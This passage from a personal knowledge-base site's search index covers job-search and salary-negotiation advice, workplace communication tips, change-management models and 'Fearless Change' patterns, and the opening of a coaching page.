overcommiting or people not comming back to you cause you ask too many (good) questions. Or they force you to do it and shut up, but less likely.\nYou can also make the thing you say no a 3th party object. \u0026ldquo;I\u0026rsquo;m afraid I have to say no to this\u0026rdquo; instead of \u0026quot; I\u0026rsquo;m afraid I have to say no to you\u0026quot;.\nTemplate # - For each Achievement/Activity Event \u0026gt; Some time indication (when, how long, ...) \u0026gt; What was my role or involvement? \u0026gt; What skills did I use, gain, or honed? \u0026gt; What was the direct impact and/or business value? \u0026gt; What was the n-tier impact and/or business value? \u0026gt; Did it had desired impact? \u0026gt; What could I do next time better? Discover your traits \u0026amp; personality # Make a list of your personality and traits\nUse this list to write down what you like and don\u0026rsquo;t like\nFrom this, try to write down an understanding of the type of jobs/roles you want and don\u0026rsquo;t want.\nWe will use this in our job search.\nTIP: Personality tests, friends, family and (former) coworkers can always help you make that list.\nDiscover your skills # Make a list of projects, feedback from (former) co-workers, efforts, initiatives or roles you were a part of. Write for each list item what you did, how it went, what impact it had, what side effects and positives. Consider adding any \u0026ldquo;lessons learned\u0026rdquo;. Don\u0026rsquo;t forget about your Brag Document which would be your natural place to go. Now ask yourself for each list item \u0026ldquo;What skills did I apply to make this happen?\u0026rdquo;. Now you have a \u0026ldquo;skill inventory\u0026rdquo; and examples of where you applied all of these skills. Now go through each skill in your skill inventory and write down, following the STAR method, an example of how you applied this skill. Note that you now can take the examples of previous steps, and you just need to rephrase them into the STAR template. Now you got a skill inventory and STAR based \u0026ldquo;stories\u0026rdquo; that can illustrate these skills. TIP: You can always contact (former) co-workers to answer a small survey about you that can help identify your skills. The Job Journey # When Applying # When you write a cover letter, consider which skills are key to sell in that cover letter, use your skill inventory\u0026rsquo;s stories to pick the right stories. When you are invited for an interview, read over your skill inventory, so you can easily use these prepared stories/examples to answer questions and proof competence. The Job Search Process # Understand what type of jobs/roles you want and don\u0026rsquo;t want (see Traits). Search for jobs that describe what you want by paying attention to the \u0026ldquo;responsibilities\u0026rdquo; section and the general description. Make a short list of jobs that you want to apply to. The Job Application Process # Using your traits \u0026amp; personality Once you have a job you want to apply for\u0026hellip; Read through the job ad and highlight any references to skills. Pay especially attention to the \u0026ldquo;qualifications\u0026rdquo; and \u0026ldquo;responsibilities\u0026rdquo; section. Now you have mapped out all the \u0026ldquo;desired\u0026rdquo; skills. Tailor your CV to match all these \u0026ldquo;desired\u0026rdquo; skills with the skill you have. Making sure they mention it and the same writing. Write the cover letter where you talk a bit about yourself, what makes you unique, your personality (Traits) without, and then pick 1 to 3 stories of your skill inventory to show the top skills you think that are key for this position. Illustrating why you are a good match. Submit Before you have an interview, read through your skill inventory to freshen up these \u0026ldquo;stories\u0026rdquo; for each skill. Now you are prepared to respond to any questions about your skills with a well prepared example to illustrate your competence. Job Search Tips # What to know about ATS ATS Resume Templates exist Use ChatGPT: \u0026ldquo;create a prompt called you are my resume creatorâ, Use SkillSyncer to test your resume ATS score. Use InstaResume for nice templates Cover Letter Template # Dear [Employer\u0026#39;s Name | Hiring Manager], Opening Paragraph: Introduce yourself and state the position you are applying for. Mention how you found out about the job opening. Provide a brief overview of why you are interested in this position and the company. Body Paragraph(s): Discuss your qualifications and experience in detail. Highlight key achievements and skills that are relevant to the job. Use specific examples to demonstrate how your background and expertise make you a good fit for the position. This section can be one or two paragraphs depending on how much information you need to convey. Insert one \u0026#34;about me\u0026#34; paragraph that talks more about you, your personality and traits, who is this person? DO I see myself working with him/her ? Closing Paragraph: Reiterate your interest in the position and the company. Summarize why you would be a good fit and express your enthusiasm for the opportunity to discuss your application further. Mention that you have attached your resume and any other required documents. Kind Regards [Your Name] The Job Interview # What are your Salary expectations? Remember the total package is what matters, so you can never give an educated guess until you understand the full package: The role Position Growth opportunities Culture Benefits Tools remember, Try to frame it as you are in it together, towards a mutual goal. Say WE, avoid YOU and I. You are eager to learn about them all through the process. \u0026ldquo;The time to discuss salary is after they\u0026rsquo;ve fallen in love with you\u0026rdquo; - John Lees keep it vague but positive, and if possible, put ball in their court. Source 1 Trick question, your answer depends on the stage of the interview process you are. Last Round: They might be actually interested in accommodating your expectation. Early Round: They don\u0026rsquo;t try to accommodate, but eliminate you if your expectations are wide off. No way of knowing the actual Salary range Avoid giving a single number Example: Part 1: At this point I need more details about the role before I can give an accurate answer on that. They might counter with \u0026ldquo;what details do you need?\u0026rdquo;. You can respond EITHER A: Need to know about the work hours, flexibility, location, expectations, scope of responsibility, benefits, remote work, bonus structure and such. B: \u0026ldquo;Maybe just more of a feel for the culture\u0026rdquo; Part 2: If they push: I understand this is an approved position, so the salary range must be approved, can I ask what it is for this position? Whatever they say, you can say \u0026ldquo;That would work for me\u0026rdquo;, unless they still ask for a number\u0026hellip; Part 3: If no range but still push for number: give a wide range. Really low to really high. I will need between 40 000 to 100 000 per year, based on the details. Key take away: NEVER GIVE A NUMBER, wide range. Now they can\u0026rsquo;t eliminate you due to salary expectations and you are able to push for the upper range when they start talking about it at a later more serious round. Source 2 Strategy One: Redirect the conversation (2 ways) Ask about their budget: \u0026ldquo;I actually don\u0026rsquo;t understand the full scope of the role at this point to accurately price myself, but I would love to know the budgeted salary range.\u0026rdquo; If they answer, you can respond: \u0026ldquo;That\u0026rsquo;s helpful to know, If you were to offer me the job, is there room to negotiate?\u0026rdquo; Move past the question and go back to your qualifications: \u0026ldquo;I\u0026rsquo;m stull trying to fully understand the role and what\u0026rsquo;s involved. I\u0026rsquo;d love to continue talking about my qualifications and why I think I\u0026rsquo;m a fit for this position.\u0026rdquo; \u0026ldquo;That\u0026rsquo;s not I\u0026rsquo;m comfortable answering, but I\u0026rsquo;m happy to talk about my qualifications for this role\u0026rdquo; Strategy 2: Offer a salary range When your deflecting didn\u0026rsquo;t work or you have enough information. Try to do research for salaries for similar roles. LinkedIn, Glassdoor, recruiters, Salary.com, if possible. Or ask people in your network if possible. Don\u0026rsquo;t focus on a single number. State your range and provide a rationale (research, skills, etc.) Acknowledge that salary is just one factor in your decision. Signal flexibility, this is a conversation, not a demand about to the total compensation. Show enthusiasm. 3 examples: I'm looking for a competitive salary that reflects my qualifications and experience. Based on my research and the requirements of the role as I understand them, I would expect a salary in the range of \u0026lt;insert\u0026gt;. Of course, I'm open to discussing the details of the entire compensation package, since salary is just one factor. I'm particularly excited to learn more about the opportunities for growth and advancement here. Given my experience and expertise, I'm looking to make between x and y in my next role. I've done some research on similar roles and talked to people in comparable organizations, all of which helped me confirm that range. I know I'd be a valuable asset to your team and am open to learning more about the budget for the role and the other benefits that you offer employees. I've been doing some research on similar roles and my understanding is that, for someone at my level, with my background and experience, I can expect to make a salary in the range of x to y. Of course compensation is not the only thing that is important to me. So I'm eager to hear more about your benefits package, including paid time off and other perks. What's most important to me is finding a place where I can thrive. I can be flexible around the exact numbers for a job that's a great fit. Tweak it to your liking. Source 3 Examples: \u0026ldquo;Thank you so much for asking. I definitely want to make sure we\u0026rsquo;re aligned before moving forward. Do you have the salary band for this position?\u0026rdquo; -\u0026gt; Trying to align along mutual goal. \u0026ldquo;I\u0026rsquo;m flexible on salary, depending on other elements of the compensation package. Do you have the salary band for this position?\u0026rdquo; \u0026ldquo;While I am flexible on salary, I am currently interviewing for positions that are in range x to y.\u0026rdquo; -IF you really know what you want. Reminds also, there is competition. Not if you are desperate or insecure. Good if you have many options and know what you want. Asking questions\u0026hellip; Source The Negotiation # Example flow when getting an offer: Express gratitude: \u0026ldquo;Thank you for your offer. I am so excited to join the team\u0026rdquo; Counter: \u0026ldquo;After learning more about the position, a salary of x feels more appropriate to me.\u0026rdquo; Unique Offering: \u0026ldquo;With my extensive background in x, I bring much more to the table than \u0026hellip;. . \u0026quot; Enroll them to help: \u0026ldquo;Are you able to help me get closer to that number?\u0026rdquo; Close with urgency: \u0026ldquo;If so, I\u0026rsquo;m happy to sign right now\u0026rdquo;. At Work - Tips From ChatGPT # Master Systems Thinking In a world of complexity and interconnected issues, systems thinking is a key skill.\nHow to Apply It:\nâ¢\tMap Interdependencies: â¢\tBreak down challenges into their components and visualize how they interact (e.g., through flowcharts or causal loops). â¢\tIdentify upstream causes and downstream effects before making decisions. â¢\tAnticipate Trade-Offs: â¢\tRecognize that every decision has ripple effects. Before acting, assess the potential unintended consequences on stakeholders, timelines, and resources. â¢\tPrioritize Long-Term Thinking: â¢\tBalance short-term wins with long-term strategic goals. Understand that sustainable solutions may take more time but yield greater overall value. Communicate with Clarity and Empathy Complex issues require clear and persuasive communication to align teams and stakeholders.\nHow to Apply It:\nâ¢\tSimplify Without Oversimplifying: â¢\tUse analogies, examples, or visuals to explain complex ideas in relatable terms while preserving nuance. â¢\tAvoid âbinaryâ thinking (e.g., âgood vs. badâ). Instead, frame discussions around options, trade-offs, and priorities. â¢\tAdapt to Your Audience: â¢\tTailor your messaging to align with stakeholdersâ values, priorities, and levels of understanding. â¢\tFor example, an executive may need a high-level summary, while your team might require detailed explanations. â¢\tEmphasize Shared Goals: â¢\tHighlight common objectives to reduce resistance or polarization. Frame challenges as opportunities to collaborate rather than compete. Develop Strategic Empathy Understanding diverse perspectives and values is critical for navigating disagreements and fostering collaboration.\nHow to Apply It:\nâ¢\tSeek First to Understand: â¢\tListen actively to othersâ concerns, motivations, and values, especially if they seem to oppose your ideas. â¢\tAsk questions like: âWhat outcomes are most important to you?â or âWhat challenges do you foresee?â â¢\tAcknowledge Emotional Dynamics: â¢\tRecognize when emotions like fear, frustration, or defensiveness are driving resistance. Address them empathetically rather than dismissing them. â¢\tBuild Bridges Across Divides: â¢\tAct as a mediator when conflicts arise, helping others see the bigger picture and align on shared interests. Balance Simplification and Complexity Avoid falling into the trap of oversimplifying complex issues, while making them actionable.\nHow to Apply It:\nâ¢\tBreak Problems Into Layers: â¢\tSeparate the high-level overview (e.g., strategy) from the detailed layers (e.g., tactics, execution). Present each layer based on the audienceâs needs. â¢\tExample: âHereâs the big picture, but letâs zoom into how it affects our team.â â¢\tTackle Problems Iteratively: â¢\tApproach large challenges in manageable steps, solving the most pressing or impactful issues first while keeping the broader system in mind. â¢\tUse Scenarios for Decision-Making: â¢\tWhen proposing solutions, present multiple scenarios with pros, cons, and trade-offs to demonstrate your understanding of complexity. Build Resilience in Decision-Making Handling complexity requires mental resilience and adaptability.\nHow to Apply It:\nâ¢\tBe Comfortable With Ambiguity: â¢\tAccept that some decisions will have uncertainty and unknown consequences. Make informed choices and adjust as you learn more. â¢\tLearn From Feedback Loops: â¢\tTreat outcomes as data points. When things donât go as planned, analyze why and adapt your strategy. â¢\tShare these learnings openly to build trust and improve team problem-solving. â¢\tStay Focused on Your Sphere of Influence: â¢\tDonât let complexity paralyze you. Focus on the aspects of a problem you can control or influence and collaborate with others on the rest. Build Alignment in a Polarized Environment Disagreements and competing interests are inevitable. Use strategies to align diverse viewpoints.\nHow to Apply It:\nâ¢\tFrame Problems Around Stakeholder Benefits: â¢\tShow how solving a complex problem benefits each stakeholder group. For example, align solutions to their goals (e.g., efficiency, growth, or impact). â¢\tBridge Personal and Organizational Goals: â¢\tHelp team members see how their work connects to the broader mission and outcomes of the organization. â¢\tFacilitate Constructive Dialogue: â¢\tWhen debates arise, guide discussions toward constructive questions: â¢\tâWhat trade-offs are we willing to accept?â â¢\tâHow can we test our assumptions?â Lead With Vision and Flexibility In interconnected systems, success often depends on balancing a clear vision with adaptability.\nHow to Apply It:\nâ¢\tArticulate a Clear Vision: â¢\tPaint a compelling picture of what success looks like and why it matters. Use this vision to anchor decisions and maintain focus amid complexity. â¢\tStay Open to Iteration: â¢\tBe ready to pivot when new information arises or when initial "},{"id":6,"href":"/change-management/","title":"Change Management","section":"","content":" Change Management # How to do cultural change- 2-2-1 rule # Science based, applied in Nike.\n2 points of reinforcement from management chain for given individual communicate they think its a good idea. They show support. 2 points of reinforcement from peers for given individual communicate they think its a good idea. They show support. 1 point of success story. Patterns # See the list of Patterns\nHow Behavior Spreads # How Behavior Spreads: The Science of Complex Contagions by Damon Centola delves into how social behaviors, ideas, and practices spread through populations, contrasting traditional views of contagion (like infectious diseases) with the spread of behaviors and innovations. Centola, a sociologist, challenges the dominant model of \u0026ldquo;simple contagions\u0026rdquo; in favor of a more nuanced framework, termed \u0026ldquo;complex contagions.\u0026rdquo; Here are the key findings and lessons from the book:\n1. Complex Contagions vs. Simple Contagions # Simple contagions refer to things like viruses, where a single contact with an infected person may be enough to catch the infection. This follows a \u0026ldquo;contact-based\u0026rdquo; model, which is easy to understand and has been the dominant framework in epidemiology and social network theory. Complex contagions involve behaviors or ideas that require reinforcement from multiple sources before they spread. Unlike a simple contagion, seeing a new behavior once may not be enough to adopt it. Examples include social movements, norms, and innovations. The spread requires social validation and exposure through multiple points of contact. 2. Strong Ties vs. Weak Ties # Traditional social network theory, drawing on Granovetterâs concept of \u0026ldquo;the strength of weak ties,\u0026rdquo; emphasizes the importance of weak ties (acquaintances) in disseminating information. Weak ties were thought to be crucial for spreading new behaviors because they connect disparate social groups. Centola argues that strong ties (close-knit social groups) are essential for spreading complex behaviors. This is because strong ties offer the social reinforcement and repeated exposure necessary to overcome the resistance to adopting new behaviors or ideas. Itâs not enough for a person to be exposed to a behavior onceâthey need validation from multiple trusted sources before adopting it. 3. The Role of Social Networks # Centola highlights that the structure of a social network is a key determinant of whether a complex behavior will spread. Dense clusters of strong ties promote the adoption of new behaviors, while sparse networks with many weak ties are better suited for spreading information quickly but not necessarily changing behavior. Network clusteringâwhere groups of people are densely interconnectedâcan facilitate the spread of complex contagions, as repeated reinforcement within these clusters encourages adoption. 4. Diffusion Dynamics # In contrast to traditional diffusion models, which suggest that behaviors spread outward from a single innovator (like a ripple in water), complex behaviors spread more unevenly, with adoption often occurring within clusters of the social network first. The behavior then jumps between clusters once it has gained sufficient momentum within each group. Thresholds for adoption are key. Individuals may not adopt a behavior unless they see a certain number of others in their social group doing the same. This leads to tipping points where behaviors suddenly spread rapidly after reaching critical mass. 5. Real-World Applications # Centola uses real-world examples, including online experiments and case studies, to show how complex contagions play out in various domains. For instance, health behaviors, like quitting smoking or adopting fitness routines, often require repeated social reinforcement. Social movements and innovationsâsuch as the Civil Rights Movement or the rise of solar energy adoptionâalso follow the complex contagion model, spreading through strong social networks and requiring multiple reinforcements before they catch on. 6. Digital Networks and Online Behavior # The book also explores how the dynamics of social contagions change in online networks, where the distinction between strong and weak ties can become blurred. Even in online spaces, Centola argues, repeated exposure and validation from multiple sources are crucial for spreading behaviors like activism or the adoption of new technologies. Online platforms and algorithms that reinforce echo chambers may actually facilitate the spread of complex behaviors within clusters, but make it harder for behaviors to jump across different social groups. 7. Implications for Policy and Innovation # Understanding how complex contagions work can help policymakers, public health officials, and innovators design more effective strategies for promoting social change. For example, simply broadcasting a public health message may not be enoughâtargeting densely connected groups within communities for sustained engagement can be far more effective. Marketers and social change advocates need to focus on building critical mass within clusters of adopters, rather than trying to target isolated individuals. This suggests a shift from mass advertising to strategies that prioritize social reinforcement within specific communities. 8. Behavioral Norms and Collective Action # Centola emphasizes that collective behaviors, like participation in protests or adopting environmental practices, often spread when individuals see enough others in their network taking action. A critical lesson is that visibility and validation within a group are essential for mobilizing large-scale collective action. Key Lessons: # Reinforcement is crucial: Unlike simple contagions, complex behaviors often require multiple exposures and social reinforcement before individuals adopt them. Strong ties matter: For behaviors to spread, close relationships (strong ties) within a social network are more important than weak ties for promoting adoption. Network structure shapes diffusion: The way people are connectedâespecially in clustersâgreatly affects whether a behavior will spread. Tipping points exist: Behaviors often spread slowly at first but can rapidly accelerate once they reach critical mass within key social clusters. Design for social networks: Policymakers, marketers, and change agents need to design interventions that leverage the power of social networks and focus on clusters for effective diffusion of behaviors. How Behavior Spreads challenges simplistic models of contagion, providing a more comprehensive framework for understanding how ideas, practices, and social movements spread in human societies.\nADKAR Model # Awareness of the need to change Desire to support and take part in the change Knowledge of how to change Ability to implement the change Reinforcement to sustain the change. The ADKAR Model is prescriptive and goal-oriented, each milestone must be achieved to define success. It uses a 1â5 scale to determine how strongly an individual meets the requirements of each milestone. If a person scores a three or below, that specific step must be addressed before moving forward, Prosci defines this as a barrier point.\nThere are other models on wikipedia\nReactions in the change curve # KÃ¼bler-Ross herself acknowledged that the stages were often misunderstood and oversimplified. She emphasized that they were not prescriptive or exhaustive but rather a way to normalize and validate the range of emotions people might feel when confronting profound loss or change.\nAs this change curve is based on Elisabeth KÃ¼bler-Ross\u0026rsquo;s stages of grief model. Which is about the terminal ill accepting their status, instead the one loosing someone. It\u0026rsquo;s also more of a range of types of emotions you can go through, not perse in that exact order.\nOthers # Resources # More Fearless Change Fearless Change - Patterns for Introducing New Ideas How Behavior Spreads Change Management - Wiki - More Models "},{"id":7,"href":"/change-management/patterns/","title":"Patterns","section":"Change Management","content":" Patterns # 1. Trial Run # Description: Try out the new idea on a small scale before making a larger commitment. Why it matters: A trial helps mitigate risk by demonstrating the potential benefits without the full commitment of a large-scale implementation. Example: John suggests piloting a new CMS with one team for a month to gather feedback before proposing a company-wide switch. 2. Guru on Your Side # Description: Get an external expert or well-respected figure to support and endorse the new idea. Why it matters: People are more likely to trust the opinion of a recognized expert, giving the change initiative more credibility. Example: Emily invites a respected external software testing expert to speak at her companyâs event, lending authority to her proposal for a new testing process. 3. Shoulder to Cry On # Description: Find someone who supports you and can listen to your frustrations during the change process. Why it matters: Change can be hard and frustrating. Having emotional support helps prevent burnout and keeps the change champion motivated. Example: David faces resistance while introducing a new tool, but his colleague Mark provides moral support, allowing him to stay focused. 4. Token # Description: Give people small, tangible items related to the new idea to keep it visible and top-of-mind. Why it matters: Physical reminders keep the new idea in peopleâs consciousness and create opportunities for conversation about it. Example: Clara distributes stickers with the phrase \u0026ldquo;Work Smart, Anywhere\u0026rdquo; as a visible reminder to encourage her team to support remote work policies. 5. Bridge-Builder # Description: Build connections between people in different departments or teams to foster collaboration. Why it matters: Organizational silos can impede change. Connecting people across teams ensures that information and support for the change can spread more easily. Example: Anita organizes informal lunch meetings between the engineering and operations teams to break down barriers and encourage collaboration for a new process automation tool. 6. Big Jolt # Description: Organize a high-energy event, such as a conference or keynote speech, to spark interest and excitement around the new idea. Why it matters: A âbig joltâ can attract attention, motivate people, and create momentum for the change initiative. Example: Raj arranges for a well-known design thinking expert to deliver a keynote at the company conference, generating excitement about his initiative. 7. In Your Space # Description: Place visible reminders about the change idea in high-traffic areas. Why it matters: Constant, visible reminders make the idea part of everyday life and keep it in people\u0026rsquo;s minds, encouraging them to adopt it. Example: Mary puts charts and posters about a new project management methodology on the walls in common areas, ensuring it remains part of everyday conversations. 8. Corporate Angel # Description: Find a high-level executive or sponsor to support the new idea and provide resources or backing. Why it matters: Support from senior leadership lends authority to the change initiative and increases the likelihood of success by securing needed resources. Example: Samantha convinces a senior executive to support her push for continuous integration, and the executive advocates for the initiative in management meetings. 9. Ask for Help # Description: Seek advice or assistance from others when you encounter challenges in introducing the new idea. Why it matters: Asking for help builds relationships, shows humility, and often provides solutions or fresh perspectives you may not have considered. Example: Paul struggles to implement a new code review tool and asks a colleague with experience for advice, helping him overcome initial resistance. 10. Do Food # Description: Provide food at meetings or informal gatherings when discussing the new idea. Why it matters: Offering food creates a relaxed, social atmosphere where people are more likely to engage in open discussions about the change without feeling pressured. Example: Tara hosts a casual lunchtime meeting with pizza to discuss a new data analytics tool, making the meeting more enjoyable and encouraging participation. 11. Royal Audience # Description: Present the new idea to high-level executives or decision-makers in a formal setting. Why it matters: Getting time with influential decision-makers shows that the initiative is taken seriously and can help secure their endorsement. Example: Jacob presents his new documentation standard to the companyâs leadership team, showing how it aligns with corporate goals and improving his chances of approval. 12. Stay in Touch # Description: Regularly check in with people after the change is introduced to offer support and keep the momentum going. Why it matters: Continuous follow-up ensures that the change is sustained over time and helps address any ongoing challenges. Example: After rolling out a new time-tracking tool, Amira keeps checking in with the team and sends updates to maintain momentum. 13. Fear Less # Description: Encourage people to experiment with the new idea and be comfortable with making mistakes as they learn. Why it matters: People are often hesitant to try new things because they fear failure. Creating a safe environment for experimentation helps overcome this barrier. Example: Lisa introduces cloud-based infrastructure by encouraging her team to try small, low-risk experiments and learn from mistakes without fear of judgment. 14. Test the Waters # Description: Gauge interest or collect informal feedback about the new idea before formally proposing it. Why it matters: Testing the waters helps you refine your pitch, identify potential allies, and avoid surprises when formally introducing the idea. Example: Kyle floats the idea of adopting new enterprise software in casual conversations to gather feedback and prepare for any resistance. 15. Celebrate Success # Description: Publicly recognize and celebrate achievements related to the change effort. Why it matters: Celebrating success boosts morale, reinforces the value of the new idea, and motivates people to continue supporting the change. Example: Megan throws a party to celebrate her teamâs successful transition to a new CRM system, recognizing their effort and keeping morale high. 16. Evangelist # Description: A dedicated person must take on the role of championing the new idea with passion and commitment. Why it matters: Change efforts often need a passionate advocate who is willing to persist and spread enthusiasm to others. Example: Sarah, a software engineer, becomes the champion for Agile practices, holding informal lunch-and-learns to introduce her team to the methodology. 17. Innovator # Description: Identify and involve those who are naturally open to trying new ideas and approaches. Why it matters: Innovators are the first to embrace change and can help prove the value of the new idea through early experimentation. Example: Tom, a forward-thinking team member, adopts a new project management tool on his own, setting an example for others to follow. 18. Early Adopter # Description: Find people who are respected by their peers and are willing to be the first to use the new idea. Why it matters: Early adopters lend credibility to the new idea and can influence others by sharing their positive experiences. Example: Jane, a well-regarded manager, is the first in her department to adopt the new software tool, encouraging others to try it as well. 19. Champion Skeptic # Description: Find someone who is known for their critical thinking and reluctance to change, and win them over to the new idea. Why it matters: Convincing a known skeptic lends credibility to the change and helps address concerns others may have. Example: Steve, a cautious team member, is persuaded to try the new quality control process. Once he supports it, the rest of the team follows suit. 20. Connector # Description: Identify key individuals who are well-connected and can help spread the new idea throughout their network. Why it matters: Connectors can amplify your message and ensure that the new idea reaches a wider audience. Example: Carlos, who knows many employees across different departments, starts sharing success stories about the new tool, helping it gain traction. 21. Personal Touch # Description: Meet individually with people to explain the new idea, address their concerns, and offer personal support. Why it matters: Personalized communication builds trust and allows you to address specific concerns, making people feel valued. Example: Emily schedules one-on-one coffee meetings with her colleagues to discuss the benefits of a new development process and answer their questions. 22. Just Do It # Description: Start implementing the new idea on a small scale without waiting for formal approval, showing what can be done. Why it matters: Action speaks louder than words. Small, visible successes help convince others to follow suit. Example: Daniel starts using a new bug-tracking tool for his projects, showing the team how it improves efficiency without waiting for formal buy-in. 23. Step by Step # Description: Break the change initiative into small, manageable steps rather than attempting large-scale transformation all at once. Why it matters: Small wins build confidence, reduce resistance, and make the change process more digestible. Example: Sarah introduces Agile practices to her team by first implementing daily stand-ups, followed by short sprints, and then retrospectives. 24. Small Successes # Description: Highlight and celebrate early wins, no matter how small, to demonstrate progress and build momentum. Why it matters: Celebrating small victories helps motivate others and shows that the new idea is working in practice. Example: After successfully implementing the new process in a small team, Megan shares the results with the wider organization to demonstrate its effectiveness. 25. Sustained Momentum # Description: Keep the energy around the change initiative alive by continuously promoting and reinforcing the new idea. Why it matters: Change efforts can lose steam if theyâre not nurtured. Regular reinforcement keeps people engaged and motivated. Example: Amira regularly sends out updates and success stories about the new process to remind people of the ongoing benefits. 26. Involve Everyone # Description: Make an effort to engage as many people as possible in the change initiative to create a sense of ownership. Why it matters: The more people involved, the more likely they are to support the change and spread it to others. Example: For a company-wide rollout of a new tool, Oliver creates cross-functional teams to ensure representatives from each department are involved. 27. Time for Reflection # Description: Give people time to think about and discuss the new idea, allowing them to process it at their own pace. Why it matters: Reflection helps individuals internalize the benefits and impact of the change, making them more likely to adopt it. Example: After introducing Agile practices, Mary sets aside time at the end of each sprint for the team to reflect on what worked and what could be improved. 28. Pick Your Battles # Description: Donât fight every battle. Focus on areas or individuals where you can make the most impact, and let some things go. Why it matters: Trying to change everything at once can lead to burnout and failure. Picking key areas to focus on maximizes the chances of success. Example: Rather than convincing everyone at once, Clara focuses on persuading a small, influential group to adopt the new remote work policy, knowing they will influence others. 29. Whisper in the Generalâs Ear # Description: Gain support from influential leaders or decision-makers who can drive the change from the top down. Why it matters: Leadership support often carries significant weight in convincing others to adopt the new idea. Example: Jacob schedules a private meeting with the companyâs CEO to explain the benefits of the new documentation system, securing executive backing for the initiative. 30. Local Sponsor # Description: Find a local leader or manager who can act as a sponsor and advocate for the change within their department or team. Why it matters: Having a local sponsor increases the chances of adoption within specific teams or departments, as they provide resources and support at the grassroots level. Example: Samantha convinces the head of her department to support the introduction of continuous integration, ensuring the necessary resources and buy-in. 31. Group Identity # Description: Build a sense of shared identity around the new idea, making it part of the groupâs culture. Why it matters: People are more likely to adopt and stick with a new idea when it becomes part of their groupâs shared identity and values. Example: To help the team embrace DevOps practices, the company hosts events where they create a shared identity around being a \u0026ldquo;DevOps team,\u0026rdquo; celebrating their collaborative spirit. 32. Celebration # Description: Celebrate milestones and successes to recognize progress and keep people motivated throughout the change process. Why it matters: Celebrations reinforce the positive impact of the new idea and build morale, making people more likely to continue supporting the change. Example: After successfully completing the first sprint with a new Agile approach, Megan organizes a team lunch to celebrate the achievement and motivate the team for future sprints. 33. Future Commitment # Description: Ask people to make a small, informal commitment to support the change in the future. Why it matters: When people verbally commit to supporting something, even if informally, they are more likely to follow through later. Example: During a team meeting, James asks his colleagues to commit to trying the new time-tracking tool at least once during the next project cycle. Most agree, making it easier to introduce later. 34. Bridge # Description: Connect the new idea to something familiar to reduce resistance and make the transition smoother. Why it matters: People are more comfortable with change when they can relate it to something they already know or do. Example: Emma compares the new documentation system to the companyâs existing project management tool, emphasizing similarities to make the transition less intimidating. 35. Myth Buster # Description: Address and dispel common misconceptions or myths about the new idea that may be causing resistance. Why it matters: False beliefs or assumptions about a new idea can hinder adoption. By correcting these misconceptions, you reduce opposition. Example: When some team members express concern that Agile will eliminate documentation, Lisa holds a session to bust the myth, explaining how Agile actually encourages concise, focused documentation. 36. Bridge the Gap # Description: Help people see the connection between their current practices and the new idea, showing them how the new idea fills a gap in their current approach. Why it matters: Highlighting the benefits of the new idea, especially how it solves current problems, makes people more willing to adopt it. Example: David demonstrates how the new testing framework will address the slow feedback cycle the team currently faces, bridging the gap between current frustrations and future improvements. 37. Tailor Made # Description: Customize the new idea to fit the specific needs and culture of the organization or team. Why it matters: A one-size-fits-all approach to change often fails. Tailoring the idea to the context increases its chances of success. Example: Instead of adopting an off-the-shelf Agile process, Jenny works with her team to modify Agile practices to fit their project timelines and workflows. 38. Small Incentives # Description: Offer small rewards or incentives to encourage people to try the new idea. Why it matters: People are more likely to try something new when thereâs a tangible benefit, even if small. Rewards help overcome inertia. Example: Sarah offers a gift card to anyone on her team who completes the training for the new version control system, increasing participation in the rollout. 39. Local Advocate # Description: Find a respected team member who can become an advocate for the new idea within their group. Why it matters: People trust their peers more than external advocates or managers. A respected local advocate can influence others more effectively. Example: Tony, a well-regarded developer, starts promoting the benefits of test-driven development (TDD) within his team, making others more open to adopting the practice. 40. Emotional Connection # Description: Help people make an emotional connection to the new idea by linking it to values they care about, such as improving work-life balance or reducing stress. Why it matters: Change is more likely to succeed when people feel emotionally invested, not just intellectually convinced. Example: During the rollout of a new collaboration tool, Kelly highlights how it will reduce unnecessary emails and late-night work, improving work-life balance. 41. Respected Techie # Description: Enlist the help of a technically skilled and respected person to support the technical aspects of the new idea. Why it matters: People are more likely to trust and follow technical advice from someone they respect and who has proven expertise. Example: When introducing a new software deployment tool, Alan enlists Jake, the most senior developer, to demonstrate how it improves deployment efficiency. Jakeâs technical expertise convinces the team to try it. 42. Set Expectations # Description: Clearly define what is expected during the change process, including roles, responsibilities, and outcomes. Why it matters: People are more likely to adopt a new idea if they know what is expected of them. Clear expectations reduce confusion and anxiety about the change. Example: When rolling out a new Agile process, Megan clearly communicates that team members are expected to attend daily stand-ups and participate in retrospectives, so no one is caught off guard. 43. Brown Bag # Description: Organize informal, lunchtime sessions to discuss and share the new idea in a relaxed setting. Why it matters: A casual environment encourages open dialogue and makes learning about the change feel less formal and pressured. Example: Sarah organizes âbrown bagâ lunch sessions where employees bring their lunches and learn about the benefits of adopting the new testing framework in a relaxed, informal setting. 44. Time for Learning # Description: Ensure that people have time to learn the new idea or technology without feeling overwhelmed by their regular responsibilities. Why it matters: People need dedicated time to explore and practice new concepts without feeling stressed about their usual work. Without time to learn, the change is more likely to fail. Example: During the introduction of a new DevOps tool, Laura ensures that her team has dedicated hours each week for training and experimentation without sacrificing their normal project timelines. 45. Step by Step Adoption # Description: Introduce the change gradually, allowing people to adopt it incrementally rather than all at once. Why it matters: Breaking the change into smaller, manageable steps reduces resistance and increases the likelihood of success. Example: Instead of switching entirely to a new CRM system, Jim rolls it out in phases, allowing one team to adopt it first and then gradually expanding to the rest of the company. 46. Shoulder to Shoulder # Description: Work alongside others who are hesitant about the change to provide hands-on help and encouragement. Why it matters: Direct support builds confidence and reduces the fear of making mistakes, making the change feel less intimidating. Example: When implementing a new coding standard, Jane spends time working alongside developers who are struggling with the change, offering guidance and assistance in real-time. 47. Bridge to the Future # Description: Help people visualize how the new idea will help them succeed in the future and show the long-term benefits. Why it matters: People are more likely to adopt a new idea if they can see how it benefits their future goals and needs, not just the present. Example: Peter presents a roadmap showing how the new data analytics platform will streamline reporting processes over time, making employees\u0026rsquo; jobs easier in the long run. 48. Involve the Boss # Description: Engage leadership early in the process to gain their support and involvement in the change initiative. Why it matters: Leaders can influence others by endorsing and participating in the change, making it more likely to succeed across the organization. Example: Amy ensures that her department head is actively involved in the rollout of the new performance review system, increasing its visibility and legitimacy within the team. "},{"id":8,"href":"/coaching/","title":"Coaching","section":"","content":" Coaching # In the coaching process you have a \u0026ldquo;Coach\u0026rdquo;, the one who coaches, and the \u0026ldquo;Client\u0026rdquo;, the one who is being coached.\nCoaching does not involve telling clients what to do but empowers them to find their own solutions.\nWhat It Is # Coaching is a developmental process where a coach supports someone in achieving specific personal or professional goals by providing guidance, feedback, and encouragement. It involves active listening, questioning, and facilitating self-discovery to help clients enhance their skills, overcome challenges, and 